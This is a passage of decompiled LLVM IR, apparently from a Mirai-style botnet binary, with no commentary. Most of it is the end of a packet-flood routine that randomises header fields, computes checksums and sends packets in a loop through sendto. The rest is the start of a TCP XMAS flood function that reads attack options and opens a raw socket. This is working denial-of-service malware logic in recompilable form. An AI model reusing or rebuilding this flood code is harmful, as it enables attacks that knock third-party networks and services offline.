  %v0_a9b4 = phi i32 [ %v0_a9b4.pre, %dec_label_pc_a9b0.preheader ], [ 0, %dec_label_pc_aaa8 ], [ 0, %dec_label_pc_a9b0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a9b4 = icmp eq i32 %v0_a9b4, 0
  store i1 %v2_a9b4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a9b4, label %dec_label_pc_a9b0, label %dec_label_pc_a9c0

dec_label_pc_a9c0:                                ; preds = %dec_label_pc_a9b0, %dec_label_pc_aaa8
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_a9c4 = load i32, i32* @r7, align 4
  %v1_a9c4 = add i32 %v0_a9c4, 27
  store i32 %v1_a9c4, i32* @sb, align 4
  %v1_a9c8 = add i32 %v0_a9c4, 47
  store i32 %v1_a9c8, i32* @sl, align 4
  br label %dec_label_pc_a9cc

dec_label_pc_a9cc:                                ; preds = %dec_label_pc_aa10, %dec_label_pc_a9c0
  %v1_a9d8 = phi i32 [ %v1_aa98, %dec_label_pc_aa10 ], [ 0, %dec_label_pc_a9c0 ]
  store i32 %v2_a4e0, i32* %r3.global-to-local, align 4
  store i32 %v3_a784, i32* %ip.global-to-local, align 4
  %v4_a9d8 = mul i32 %v1_a9d8, 4
  %v5_a9d8 = add i32 %v4_a9d8, %v2_a4e0
  %v6_a9d8 = inttoptr i32 %v5_a9d8 to i32*
  %v7_a9d8 = load i32, i32* %v6_a9d8, align 4
  store i32 %v7_a9d8, i32* @r4, align 4
  store i32 65535, i32* @r5, align 4
  store i1 %v3_a9e0, i1* %cpsr_z.global-to-local, align 1
  %v1_a9e4 = add i32 %v7_a9d8, 20
  store i32 %v1_a9e4, i32* @r6, align 4
  br i1 %v3_a9e0, label %dec_label_pc_aabc, label %dec_label_pc_a9ec

dec_label_pc_a9ec:                                ; preds = %dec_label_pc_a9cc
  store i32 %v3_a78c, i32* @lr, align 4
  store i1 %v3_a9f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a9f0, label %dec_label_pc_aad0, label %dec_label_pc_a9f8

dec_label_pc_a9f8:                                ; preds = %dec_label_pc_aabc.dec_label_pc_a9f8_crit_edge, %dec_label_pc_a9ec
  %v1_a9fc = phi i32 [ %v1_a9fc.pre, %dec_label_pc_aabc.dec_label_pc_a9f8_crit_edge ], [ 65535, %dec_label_pc_a9ec ]
  store i32 %v3_a7a8, i32* %r0.global-to-local, align 4
  %v9_a9fc = icmp eq i32 %v3_a7a8, %v1_a9fc
  store i1 %v9_a9fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a9fc, label %dec_label_pc_aae4, label %dec_label_pc_aa04

dec_label_pc_aa04:                                ; preds = %dec_label_pc_aad0, %dec_label_pc_a9f8
  %v1_aa08 = phi i32 [ %v1_aadc, %dec_label_pc_aad0 ], [ %v1_a9fc, %dec_label_pc_a9f8 ]
  store i32 %v3_a7b0, i32* %r2.global-to-local, align 4
  %v9_aa08 = icmp eq i32 %v3_a7b0, %v1_aa08
  store i1 %v9_aa08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aa08, label %dec_label_pc_aaf8, label %dec_label_pc_aa10

dec_label_pc_aa10:                                ; preds = %dec_label_pc_aae4, %dec_label_pc_aa04, %dec_label_pc_aaf8
  %v0_aa10 = load i32, i32* @r4, align 4
  %v1_aa10 = add i32 %v0_aa10, 41
  store i32 %v1_aa10, i32* %r0.global-to-local, align 4
  store i32 %v4_aa14.pre-phi, i32* %r1.global-to-local, align 4
  %v2_aa18 = call i32 @rand_alpha_str(i32 %v1_aa10, i32 %v4_aa14.pre-phi)
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_aa20 = load i32, i32* @r4, align 4
  %v3_aa20 = add i32 %v2_aa20, 10
  %v4_aa20 = inttoptr i32 %v3_aa20 to i16*
  store i16 0, i16* %v4_aa20, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_aa28 = load i32, i32* @r4, align 4
  store i32 %v0_aa28, i32* @r0, align 4
  %v2_aa2c = call i32 @checksum_generic(i32 %v0_aa28, i32 20)
  %v3_aa2c = trunc i32 %v2_aa2c to i16
  store i32 %v2_aa2c, i32* %r0.global-to-local, align 4
  %v3_aa30 = load i32, i32* @r4, align 4
  %v4_aa30 = add i32 %v3_aa30, 10
  %v5_aa30 = inttoptr i32 %v4_aa30 to i16*
  store i16 %v3_aa2c, i16* %v5_aa30, align 2
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_aa38 = load i32, i32* @r6, align 4
  %v3_aa38 = add i32 %v2_aa38, 6
  %v4_aa38 = inttoptr i32 %v3_aa38 to i16*
  store i16 0, i16* %v4_aa38, align 2
  %v0_aa3c = load i32, i32* @r6, align 4
  store i32 %v0_aa3c, i32* @r1, align 4
  %v1_aa40 = add i32 %v0_aa3c, 4
  %v2_aa40 = inttoptr i32 %v1_aa40 to i16*
  %v3_aa40 = load i16, i16* %v2_aa40, align 2
  %v4_aa40 = zext i16 %v3_aa40 to i32
  store i32 %v4_aa40, i32* %r2.global-to-local, align 4
  %v0_aa44 = load i32, i32* @sb, align 4
  store i32 %v0_aa44, i32* %r3.global-to-local, align 4
  %v0_aa48 = load i32, i32* @r4, align 4
  store i32 %v0_aa48, i32* %r0.global-to-local, align 4
  %v4_aa4c = call i32 @checksum_tcpudp(i32 %v0_aa48, i32 %v0_aa3c, i32 %v4_aa40, i32 %v0_aa44)
  %v5_aa4c = trunc i32 %v4_aa4c to i16
  store i32 %v4_aa4c, i32* %r0.global-to-local, align 4
  %v3_aa50 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aa50, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @lr, align 4
  %v3_aa58 = mul i32 %v3_aa50, 32
  store i32 %v3_aa58, i32* %ip.global-to-local, align 4
  %v3_aa5c = load i32, i32* @r6, align 4
  %v4_aa5c = add i32 %v3_aa5c, 6
  %v5_aa5c = inttoptr i32 %v4_aa5c to i16*
  store i16 %v5_aa4c, i16* %v5_aa5c, align 2
  %v0_aa60 = load i32, i32* %ip.global-to-local, align 4
  %v1_aa60 = load i32, i32* %r3.global-to-local, align 4
  %tmp128 = mul i32 %v1_aa60, -8
  %v5_aa60 = add i32 %v0_aa60, %tmp128
  store i32 %v5_aa60, i32* %ip.global-to-local, align 4
  %v0_aa64 = load i32, i32* @r6, align 4
  %v1_aa64 = add i32 %v0_aa64, 2
  %v2_aa64 = inttoptr i32 %v1_aa64 to i16*
  %v3_aa64 = load i16, i16* %v2_aa64, align 2
  %v4_aa64 = zext i16 %v3_aa64 to i32
  store i32 %v4_aa64, i32* @r6, align 4
  %v1_aa68 = load i32, i32* @lr, align 4
  %v2_aa68 = add i32 %v1_aa68, %v5_aa60
  store i32 %v2_aa68, i32* %ip.global-to-local, align 4
  %v3_aa6c = add i32 %v2_aa68, 2
  %v4_aa6c = inttoptr i32 %v3_aa6c to i16*
  store i16 %v3_aa64, i16* %v4_aa6c, align 2
  %v0_aa70 = load i32, i32* @fp, align 4
  %v1_aa70 = load i32, i32* %ip.global-to-local, align 4
  %v2_aa70 = add i32 %v1_aa70, 4
  %v3_aa70 = inttoptr i32 %v2_aa70 to i32*
  store i32 %v0_aa70, i32* %v3_aa70, align 4
  %v0_aa74 = load i32, i32* @r4, align 4
  store i32 %v0_aa74, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_a728, i32* %r0.global-to-local, align 4
  %v0_aa80 = load i32, i32* @sl, align 4
  store i32 %v0_aa80, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_aa88 = load i32, i32* %ip.global-to-local, align 4
  %v6_aa90 = call i32 @__libc_sendto(i32 %v3_a728, i32 %v0_aa74, i32 %v0_aa80, i32 16384, i32 %v0_aa88, i32 16)
  %v3_aa94 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aa94, i32* %r3.global-to-local, align 4
  %v1_aa98 = add i32 %v3_aa94, 1
  store i32 %v1_aa98, i32* %r0.global-to-local, align 4
  %v0_aa9c = load i32, i32* @r8, align 4
  %v9_aa9c = icmp eq i32 %v0_aa9c, %v1_aa98
  store i1 %v9_aa9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_aa98, i32* %stack_var_-44, align 4
  %v8_aaa4 = icmp sgt i32 %v0_aa9c, %v1_aa98
  br i1 %v8_aaa4, label %dec_label_pc_a9cc, label %dec_label_pc_aaa8

dec_label_pc_aaa8:                                ; preds = %dec_label_pc_aa10
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_aaac = icmp eq i32 %v0_aa9c, 0
  store i1 %v2_aaac, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_aaac, label %dec_label_pc_a9b0, label %dec_label_pc_a9c0

dec_label_pc_aabc:                                ; preds = %dec_label_pc_a9cc
  %v0_aabc = call i32 @rand_next()
  %v1_aabc = trunc i32 %v0_aabc to i16
  store i32 %v0_aabc, i32* %r0.global-to-local, align 4
  store i32 %v3_a78c, i32* @lr, align 4
  %v1_aac4 = load i32, i32* @r5, align 4
  %v9_aac4 = icmp eq i32 %v3_a78c, %v1_aac4
  store i1 %v9_aac4, i1* %cpsr_z.global-to-local, align 1
  %v3_aac8 = load i32, i32* @r4, align 4
  %v4_aac8 = add i32 %v3_aac8, 4
  %v5_aac8 = inttoptr i32 %v4_aac8 to i16*
  store i16 %v1_aabc, i16* %v5_aac8, align 2
  br i1 %v9_aac4, label %dec_label_pc_aad0, label %dec_label_pc_aabc.dec_label_pc_a9f8_crit_edge

dec_label_pc_aabc.dec_label_pc_a9f8_crit_edge:    ; preds = %dec_label_pc_aabc
  %v1_a9fc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_a9f8

dec_label_pc_aad0:                                ; preds = %dec_label_pc_aabc, %dec_label_pc_a9ec
  %v0_aad0 = call i32 @rand_next()
  %v1_aad0 = trunc i32 %v0_aad0 to i16
  %v3_aad4 = load i32, i32* @r4, align 4
  %v4_aad4 = add i32 %v3_aad4, 20
  %v5_aad4 = inttoptr i32 %v4_aad4 to i16*
  store i16 %v1_aad0, i16* %v5_aad4, align 2
  store i32 %v3_a7a8, i32* %r0.global-to-local, align 4
  %v1_aadc = load i32, i32* @r5, align 4
  %v9_aadc = icmp eq i32 %v3_a7a8, %v1_aadc
  store i1 %v9_aadc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aadc, label %dec_label_pc_aae4, label %dec_label_pc_aa04

dec_label_pc_aae4:                                ; preds = %dec_label_pc_aad0, %dec_label_pc_a9f8
  %v0_aae4 = call i32 @rand_next()
  %v1_aae4 = trunc i32 %v0_aae4 to i16
  store i32 %v0_aae4, i32* %r0.global-to-local, align 4
  store i32 %v3_a7b0, i32* %r2.global-to-local, align 4
  %v1_aaec = load i32, i32* @r5, align 4
  %v9_aaec = icmp eq i32 %v3_a7b0, %v1_aaec
  store i1 %v9_aaec, i1* %cpsr_z.global-to-local, align 1
  %v3_aaf0 = load i32, i32* @r6, align 4
  %v4_aaf0 = add i32 %v3_aaf0, 2
  %v5_aaf0 = inttoptr i32 %v4_aaf0 to i16*
  store i16 %v1_aae4, i16* %v5_aaf0, align 2
  br i1 %v9_aaec, label %dec_label_pc_aaf8, label %dec_label_pc_aa10

dec_label_pc_aaf8:                                ; preds = %dec_label_pc_aae4, %dec_label_pc_aa04
  %v0_aaf8 = call i32 @rand_next()
  %v1_aaf8 = trunc i32 %v0_aaf8 to i16
  store i32 %v0_aaf8, i32* %r0.global-to-local, align 4
  %v3_aafc = load i32, i32* @r4, align 4
  %v4_aafc = add i32 %v3_aafc, 28
  %v5_aafc = inttoptr i32 %v4_aafc to i16*
  store i16 %v1_aaf8, i16* %v5_aafc, align 2
  br label %dec_label_pc_aa10

dec_label_pc_ab04:                                ; preds = %dec_label_pc_a690, %dec_label_pc_a670, %dec_label_pc_a614, %entry
  %v0_ab04 = call i32 @rand_next()
  %v1_ab08 = urem i32 %v0_ab04, 4
  store i32 %v1_ab08, i32* %r0.global-to-local, align 4
  %v2_ab0c = icmp eq i32 %v1_ab08, 3
  store i1 %v2_ab0c, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_ab04 to i2
  switch i2 %trunc, label %dec_label_pc_a70811 [
    i2 0, label %dec_label_pc_ab40
    i2 1, label %dec_label_pc_ab6c
    i2 -2, label %dec_label_pc_ab60
    i2 -1, label %dec_label_pc_ab50
  ]

dec_label_pc_ab28:                                ; preds = %dec_label_pc_a738
  store i32 %v3_a728, i32* %r0.global-to-local, align 4
  %v1_ab2c = call i32 @__GI___libc_close(i32 %v3_a728)
  store i32 %v1_ab2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ab30

dec_label_pc_ab30:                                ; preds = %dec_label_pc_a710, %dec_label_pc_a708, %dec_label_pc_ab28
  %v1_ab3c = phi i32 [ %v3_a728, %dec_label_pc_a710 ], [ %v1_ab3c49, %dec_label_pc_a708 ], [ %v1_ab2c, %dec_label_pc_ab28 ]
  store i32 %v18_a4c0, i32* %sb.global-to-local, align 4
  store i32 %v27_a4c0, i32* %lr.global-to-local, align 4
  ret i32 %v1_ab3c

dec_label_pc_ab40:                                ; preds = %dec_label_pc_ab04
  store i32 134744072, i32* @fp, align 4
  br label %dec_label_pc_a708

dec_label_pc_ab50:                                ; preds = %dec_label_pc_ab04
  store i32 33686020, i32* @fp, align 4
  br label %dec_label_pc_a708

dec_label_pc_ab60:                                ; preds = %dec_label_pc_ab04
  store i32 104859200, i32* @fp, align 4
  br label %dec_label_pc_a708

dec_label_pc_ab6c:                                ; preds = %dec_label_pc_ab04
  store i32 707416650, i32* @fp, align 4
  br label %dec_label_pc_a708

; uselistorder directives
  uselistorder i32 %v1_ab08, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_ab04, { 1, 0 }
  uselistorder i32 %v0_aaf8, { 1, 0 }
  uselistorder i32 %v0_aae4, { 1, 0 }
  uselistorder i32 %v1_aadc, { 1, 0 }
  uselistorder i32 %v0_aabc, { 1, 0 }
  uselistorder i32 %v1_aa98, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_aa60, { 1, 0 }
  uselistorder i32 %v4_aa4c, { 1, 0 }
  uselistorder i32 %v2_aa2c, { 1, 0 }
  uselistorder i1 %v3_a9f0, { 1, 0 }
  uselistorder i1 %v3_a9e0, { 1, 0 }
  uselistorder i32 %v4_aa14.pre-phi, { 1, 0 }
  uselistorder i32 %v1_a988, { 1, 0, 2 }
  uselistorder i32 %v0_a978, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v0_a964, { 2, 0, 3, 1 }
  uselistorder i32 %v0_a960, { 1, 0, 2 }
  uselistorder i32 %v0_a8d0, { 1, 0 }
  uselistorder i32 %v4_a8cc, { 2, 0, 3, 4, 1 }
  uselistorder i32 %tmp111, { 1, 0 }
  uselistorder i32 %v3_a818, { 1, 0 }
  uselistorder i32 %v3_a7d4, { 1, 0 }
  uselistorder i32 %v1_a7c8, { 2, 0, 1 }
  uselistorder i32 %v3_a794, { 1, 0 }
  uselistorder i32 %v3_a78c, { 1, 2, 3, 5, 0, 4 }
  uselistorder i32 %v3_a784, { 0, 2, 1 }
  uselistorder i8 %v5_a77c, { 1, 0, 2 }
  uselistorder i32 %v1_a768, { 1, 0 }
  uselistorder i32 %v0_a768, { 1, 0 }
  uselistorder i1 %v7_a758, { 1, 0 }
  uselistorder i1 %v7_a72c, { 1, 0 }
  uselistorder i32 %v3_a728, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v0_a708, { 1, 0, 2 }
  uselistorder i32 %v2_a6d8, { 0, 1, 3, 2 }
  uselistorder i32 %v2_a6d4, { 1, 0, 2 }
  uselistorder i1 %v7_a6c4, { 1, 0 }
  uselistorder i32 %v1_a6c0, { 1, 0, 2 }
  uselistorder i1 %v8_a6b8, { 1, 0 }
  uselistorder i1 %v7_a6b4, { 1, 0 }
  uselistorder i32 %v1_a6a8, { 1, 0 }
  uselistorder i8 %v2_a69c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_a6a0, { 1, 0 }
  uselistorder i32 %v0_a6c0, { 3, 0, 2, 1 }
  uselistorder i32 %v0_a690, { 0, 2, 1 }
  uselistorder i32 %v1_a6a4, { 0, 2, 1 }
  uselistorder i32 %v2_a678, { 1, 0, 2, 3 }
  uselistorder i32 %v0_a670, { 1, 0, 2, 3 }
  uselistorder i1 %v7_a668, { 1, 0 }
  uselistorder i32 %v0_a668, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_a60c, { 1, 0, 3, 2 }
  uselistorder i32 %v6_a5ac, { 1, 0, 2, 3 }
  uselistorder i32 %v6_a590, { 1, 0, 2, 3 }
  uselistorder i32 %v6_a578, { 2, 1, 0 }
  uselistorder i32 %v1_a560, { 1, 0 }
  uselistorder i32 %v7_a51c, { 1, 0, 2 }
  uselistorder i32 %v2_a4e0, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %sb.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 1, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 35, 34, 36, 38, 37, 40, 39, 0 }
  uselistorder i32* %r0.global-to-local, { 58, 56, 57, 1, 3, 2, 5, 4, 6, 8, 7, 9, 10, 11, 13, 12, 16, 14, 15, 17, 18, 23, 19, 20, 21, 22, 27, 24, 25, 26, 28, 30, 29, 31, 32, 33, 34, 36, 35, 37, 38, 40, 39, 41, 43, 42, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 0 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i1* %cpsr_z.global-to-local, { 31, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 25, 26, 27, 24, 21, 28, 29, 30 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ab30, { 2, 0, 1 }
  uselistorder label %dec_label_pc_aa10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a9c0, { 1, 0 }
  uselistorder label %dec_label_pc_a9b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a9b0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_a980, { 1, 0 }
  uselistorder label %.thread20, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %dec_label_pc_a6d0, { 1, 0 }
  uselistorder label %dec_label_pc_a6c4, { 1, 0 }
  uselistorder label %dec_label_pc_a690, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a688, { 1, 0 }
}

define i32 @attack_method_tcpxmas(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_ab7c = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_ab98 = call i32 @calloc(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_aba4 = load i32, i32* @r6, align 4
  store i32 %v0_aba4, i32* %r0.global-to-local, align 4
  %v2_aba8 = call i32 @calloc(i32 %v0_aba4, i32 4)
  %v0_abac = load i32, i32* @r5, align 4
  store i32 %v0_abac, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_abbc = load i32, i32* @r4, align 4
  store i32 %v0_abbc, i32* %r0.global-to-local, align 4
  %v5_abc0 = inttoptr i32 %v0_abac to i32*
  %v6_abc0 = call i32 @attack_get_opt_int(i32 %v0_abbc, i32* %v5_abc0, i32 2, i32 0)
  %v1_abcc = urem i32 %v6_abc0, 256
  store i32 %v1_abcc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_abd8 = load i32, i32* @r5, align 4
  store i32 %v0_abd8, i32* %r1.global-to-local, align 4
  %v0_abdc = load i32, i32* @r4, align 4
  store i32 %v0_abdc, i32* %r0.global-to-local, align 4
  %v5_abe0 = trunc i32 %v6_abc0 to i8
  %v6_abe4 = inttoptr i32 %v0_abd8 to i32*
  %v7_abe4 = call i32 @attack_get_opt_int(i32 %v0_abdc, i32* %v6_abe4, i32 3, i32 65535)
  %v0_abe8 = load i32, i32* @r5, align 4
  store i32 %v0_abe8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_abe4, i32* @r7, align 4
  %v0_abf8 = load i32, i32* @r4, align 4
  store i32 %v0_abf8, i32* %r0.global-to-local, align 4
  %v4_abfc = inttoptr i32 %v0_abe8 to i32*
  %v5_abfc = call i32 @attack_get_opt_int(i32 %v0_abf8, i32* %v4_abfc, i32 4, i32 64)
  %v1_ac04 = urem i32 %v5_abfc, 256
  store i32 %v1_ac04, i32* %ip.global-to-local, align 4
  %v0_ac08 = load i32, i32* @r5, align 4
  store i32 %v0_ac08, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac14 = load i32, i32* @r4, align 4
  store i32 %v0_ac14, i32* %r0.global-to-local, align 4
  %v6_ac1c = inttoptr i32 %v0_ac08 to i32*
  %v7_ac1c = call i32 @attack_get_opt_int(i32 %v0_ac14, i32* %v6_ac1c, i32 5, i32 1)
  %v1_ac28 = urem i32 %v7_ac1c, 256
  store i32 %v1_ac28, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_ac30 = load i32, i32* @r5, align 4
  store i32 %v0_ac30, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_ac38 = load i32, i32* @r4, align 4
  store i32 %v0_ac38, i32* %r0.global-to-local, align 4
  %v5_ac40 = inttoptr i32 %v0_ac30 to i32*
  %v6_ac40 = call i32 @attack_get_opt_int(i32 %v0_ac38, i32* %v5_ac40, i32 7, i32 65535)
  %v0_ac44 = load i32, i32* @r5, align 4
  store i32 %v0_ac44, i32* %r1.global-to-local, align 4
  %v3_ac48 = mul i32 %v6_ac40, 65536
  store i32 %v3_ac48, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac54 = load i32, i32* @r4, align 4
  store i32 %v0_ac54, i32* %r0.global-to-local, align 4
  %v3_ac58 = urem i32 %v6_ac40, 65536
  store i32 %v3_ac58, i32* @sl, align 4
  %v4_ac5c = inttoptr i32 %v0_ac44 to i32*
  %v5_ac5c = call i32 @attack_get_opt_int(i32 %v0_ac54, i32* %v4_ac5c, i32 11, i32 1)
  %v1_ac64 = urem i32 %v5_ac5c, 256
  store i32 %v1_ac64, i32* %ip.global-to-local, align 4
  %v0_ac68 = load i32, i32* @r5, align 4
  store i32 %v0_ac68, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac74 = load i32, i32* @r4, align 4
  store i32 %v0_ac74, i32* %r0.global-to-local, align 4
  %v5_ac7c = inttoptr i32 %v0_ac68 to i32*
  %v6_ac7c = call i32 @attack_get_opt_int(i32 %v0_ac74, i32* %v5_ac7c, i32 12, i32 1)
  %v1_ac84 = urem i32 %v6_ac7c, 256
  store i32 %v1_ac84, i32* %ip.global-to-local, align 4
  %v0_ac88 = load i32, i32* @r5, align 4
  store i32 %v0_ac88, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac94 = load i32, i32* @r4, align 4
  store i32 %v0_ac94, i32* %r0.global-to-local, align 4
  %v5_ac9c = inttoptr i32 %v0_ac88 to i32*
  %v6_ac9c = call i32 @attack_get_opt_int(i32 %v0_ac94, i32* %v5_ac9c, i32 13, i32 1)
  %v1_aca4 = urem i32 %v6_ac9c, 256
  store i32 %v1_aca4, i32* %ip.global-to-local, align 4
  %v0_aca8 = load i32, i32* @r5, align 4
  store i32 %v0_aca8, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_acb4 = load i32, i32* @r4, align 4
  store i32 %v0_acb4, i32* %r0.global-to-local, align 4
  %v5_acbc = inttoptr i32 %v0_aca8 to i32*
  %v6_acbc = call i32 @attack_get_opt_int(i32 %v0_acb4, i32* %v5_acbc, i32 14, i32 1)
  %v1_acc4 = urem i32 %v6_acbc, 256
  store i32 %v1_acc4, i32* %ip.global-to-local, align 4
  %v0_acc8 = load i32, i32* @r5, align 4
  store i32 %v0_acc8, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_acd4 = load i32, i32* @r4, align 4
  store i32 %v0_acd4, i32* %r0.global-to-local, align 4
  %v5_acdc = inttoptr i32 %v0_acc8 to i32*
  %v6_acdc = call i32 @attack_get_opt_int(i32 %v0_acd4, i32* %v5_acdc, i32 15, i32 1)
  %v1_ace4 = urem i32 %v6_acdc, 256
  store i32 %v1_ace4, i32* %ip.global-to-local, align 4
  %v0_ace8 = load i32, i32* @r5, align 4
  store i32 %v0_ace8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_acf4 = load i32, i32* @r4, align 4
  store i32 %v0_acf4, i32* %r0.global-to-local, align 4
  %v5_acfc = inttoptr i32 %v0_ace8 to i32*
  %v6_acfc = call i32 @attack_get_opt_int(i32 %v0_acf4, i32* %v5_acfc, i32 16, i32 1)
  %v1_ad04 = urem i32 %v6_acfc, 256
  store i32 %v1_ad04, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_ad10 = load i32, i32* @r5, align 4
  store i32 %v0_ad10, i32* %r1.global-to-local, align 4
  %v0_ad14 = load i32, i32* @r4, align 4
  store i32 %v0_ad14, i32* %r0.global-to-local, align 4
  %v5_ad1c = inttoptr i32 %v0_ad10 to i32*
  %v6_ad1c = call i32 @attack_get_opt_int(i32 %v0_ad14, i32* %v5_ad1c, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ad2c = load i32, i32* @r5, align 4
  store i32 %v0_ad2c, i32* %r1.global-to-local, align 4
  %v0_ad30 = load i32, i32* @r4, align 4
  store i32 %v0_ad30, i32* %r0.global-to-local, align 4
  %v4_ad34 = inttoptr i32 %v0_ad2c to i32*
  %v5_ad34 = call i32 @attack_get_opt_int(i32 %v0_ad30, i32* %v4_ad34, i32 1, i32 1)
  %v1_ad3c = urem i32 %v5_ad34, 256
  store i32 %v1_ad3c, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_ad50 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_ad50, i32* %r0.global-to-local, align 4
  %v7_ad54 = icmp eq i32 %v3_ad50, -1
  store i1 %v7_ad54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_ad50, i32* @sb, align 4
